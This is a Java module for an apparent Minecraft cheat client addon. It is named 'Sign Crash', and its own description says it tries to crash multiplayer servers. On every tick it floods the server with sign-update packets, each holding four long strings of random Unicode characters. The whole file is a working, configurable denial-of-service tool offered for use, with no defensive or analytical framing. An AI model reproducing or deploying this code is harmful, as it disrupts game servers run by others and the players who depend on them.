package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.Objects;
import java.util.Random;

public class SignCrash extends Module {
    private final Logger LOG = LogManager.getLogger();

    private final Setting<Integer> packets;

    private final Setting<Boolean> autoDisable;

    public SignCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Sign Crash", "CRYSTAL || Attempts to crash the server by spamming sign update packets. (By 0x150)");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("The number of packets to send per tick.")
            .defaultValue(38)
            .min(1)
            .sliderMax(100)
            .build()
        );
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Automatically disables the module on server kick.")
            .defaultValue(true)
            .build()
        );
    }

    public static String randomString(int size) {
        String end;
        Random random = new Random();
        StringBuilder sb = new StringBuilder();
        int i = 0;
        while (true) {
            if (i < size) {
                String s = String.valueOf((char) random.nextInt(0xFFFF));
                sb.append(s);
                i++;
            } else {
                break;
            }
        }
        end = sb.toString();
        return end;
    }

    public static int stringSize = 598;

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            if((mc.player != null) && (mc.getNetworkHandler() != null))
            {
                int i = 0;
                if (i < packets.get()) {
                    do {
                        if (mc.player == null) {
                            throw new AssertionError();
                        } else {
                            UpdateSignC2SPacket packet = new UpdateSignC2SPacket(mc.player.getBlockPos(), true, randomString(stringSize), randomString(stringSize),
                                randomString(stringSize), randomString(stringSize));

                            try {
                                Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
                            } catch (Exception e) {
                                LOG.error("Error sending sign update packet: {}", e.getMessage());
                            }
                            ++i;
                        }
                    } while (i < packets.get());
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
